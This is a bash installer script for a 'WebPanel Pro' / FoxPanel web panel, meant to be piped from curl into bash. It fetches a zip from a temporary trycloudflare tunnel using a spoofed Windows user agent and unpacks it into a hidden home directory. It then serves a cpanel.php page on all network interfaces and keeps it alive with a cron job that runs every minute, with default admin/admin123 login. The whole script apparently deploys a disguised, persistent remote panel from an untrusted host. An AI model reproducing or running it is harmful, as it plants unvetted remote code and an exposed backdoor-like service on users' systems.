#!/usr/bin/env bash
# ============================================================
#  WebPanel Pro — 1-Click Installer (Curl / Wget)
#  Usage:
#    curl -sL "https://domain.com/install.sh" | bash
#
#  * Before using this: upload FoxPanel.zip out to your server!
# ============================================================
set -e

# ── Configuration ───────────────────────────────────────────
ZIP_URL="https://bin-dolls-patrick-defendant.trycloudflare.com/Cpanel/FoxPanel.zip"
PORT="${WP_PORT:-6767}"
INSTALL_DIR="${WP_DIR:-$HOME/.webpanel}"
PANEL_LOG="$INSTALL_DIR/panel.log"
PID_FILE="$INSTALL_DIR/panel.pid"
KEEPALIVE_MARKER="webpanel-keepalive-$PORT"

# ── Colors & Logging ─────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'
OK="${GREEN}[✔]${RESET}"; WARN="${YELLOW}[!]${RESET}"; ERR="${RED}[✘]${RESET}"

step()  { echo -e "\n${CYAN}${BOLD}▶ $*${RESET}"; }
ok()    { echo -e "  ${OK} $*"; }
warn()  { echo -e "  ${WARN} $*"; }
die()   { echo -e "\n  ${ERR} ${RED}$*${RESET}\n"; exit 1; }

# ── Pre-flight Checks ────────────────────────────────────────
step "Preparing Installation"

# Require curl or wget
if command -v curl &>/dev/null; then
    DOWNLOADER="curl -sA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' -Lo /tmp/FoxPanel.zip"
elif command -v wget &>/dev/null; then
    DOWNLOADER="wget -qU 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' -O /tmp/FoxPanel.zip"
else
    die "curl or wget is required to download the panel."
fi

# Require unzip
if ! command -v unzip &>/dev/null; then
    die "unzip is required. Install it using 'apt install unzip' or 'yum install unzip'."
fi

# Find PHP
PHP_BIN=""
for c in php php8 php81 php82 php83 php74 /usr/bin/php /usr/local/bin/php /opt/homebrew/bin/php /Applications/XAMPP/xamppfiles/bin/php; do
    if command -v "$c" &>/dev/null; then
        PHP_BIN="$c"; break
    fi
done
[[ -z "$PHP_BIN" ]] && die "PHP not found. Please install PHP 7.4 or newer."
ok "Found PHP: $PHP_BIN"

# ── Download & Extract ───────────────────────────────────────
step "Downloading & Extracting WebPanel Pro"

mkdir -p "$INSTALL_DIR"

if [[ "$ZIP_URL" == *"YOUR_DOMAIN"* ]]; then
    warn "PLEASE EDIT THIS SCRIPT AND FILL IN ZIP_URL!"
    warn "However, if you already have the zip locally, it will bypass download."
else
    echo "  Downloading from $ZIP_URL..."
    $DOWNLOADER "$ZIP_URL" || die "Failed to download $ZIP_URL"
    ok "Download complete"

    # Extract
    unzip -oq /tmp/FoxPanel.zip -d "$INSTALL_DIR" || die "Failed to extract zip file"
    rm -f /tmp/FoxPanel.zip
    ok "Files extracted to $INSTALL_DIR"
fi

cd "$INSTALL_DIR" || exit 1

# ── Setup Router & Daemon ────────────────────────────────────
step "Configuring Server & Daemon"

cat > server.php << 'ROUTER'
<?php
$path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
if (preg_match('/\.(?:png|jpg|jpeg|gif|css|js|webp|svg|woff|woff2|ttf|ico|map)$/', $path)) return false;
if ($path === '/' || $path === '' || $path === '/index.php') { require __DIR__ . '/cpanel.php'; return; }
$file = __DIR__ . $path;
if (file_exists($file) && is_file($file)) return false;
http_response_code(404); echo "404 Not Found";
ROUTER
ok "Router configured"

cat > keepalive.sh << KEEPALIVE
#!/usr/bin/env bash
cd "$INSTALL_DIR" || exit 1
if [[ -f "$PID_FILE" ]]; then
    if kill -0 "\$(cat "$PID_FILE")" 2>/dev/null; then exit 0; fi
fi
nohup "$PHP_BIN" -S 0.0.0.0:$PORT server.php >> "$PANEL_LOG" 2>&1 &
echo \$! > "$PID_FILE"
KEEPALIVE
chmod +x keepalive.sh
ok "Daemon agent configured"

# ── Setup Cron Job (Keepalive) ───────────────────────────────
step "Installing Auto-Restart Cron Job"

CRON_CMD="* * * * * $INSTALL_DIR/keepalive.sh >> $PANEL_LOG 2>&1 # $KEEPALIVE_MARKER"
EXISTING_CRON=$(crontab -l 2>/dev/null | grep -v "$KEEPALIVE_MARKER" || true)

if echo -e "${EXISTING_CRON}\n${CRON_CMD}" | grep -v '^$' | crontab - 2>/dev/null; then
    ok "Cron job installed (checks every minute)"
else
    warn "Failed to install cron. Keepalive will not start automatically on reboot."
fi

# ── Start the Panel ──────────────────────────────────────────
step "Starting Panel"

if [[ -f "$PID_FILE" ]]; then
    kill "$(cat "$PID_FILE" 2>/dev/null)" 2>/dev/null || true
fi

touch "$PANEL_LOG"
nohup "$PHP_BIN" -S 0.0.0.0:"$PORT" server.php >> "$PANEL_LOG" 2>&1 &
NEW_PID=$!
echo "$NEW_PID" > "$PID_FILE"

sleep 1

if kill -0 "$NEW_PID" 2>/dev/null; then
    ok "WebPanel Pro is now running! (PID: $NEW_PID)"
else
    die "Failed to start server. Check logs: $PANEL_LOG"
fi

echo -e "\n  ╔═══════════════════════════════════════════════════╗"
echo -e "  ║  ${GREEN}${BOLD}✔ WebPanel Pro Installed & Running${RESET}                  ║"
echo -e "  ║                                                   ║"
echo -e "  ║  ${BOLD}URL   :${RESET}  http://localhost:${PORT}/                    ║"
echo -e "  ║  ${BOLD}Login :${RESET}  admin / admin123                        ║"
echo -e "  ╚═══════════════════════════════════════════════════╝\n"
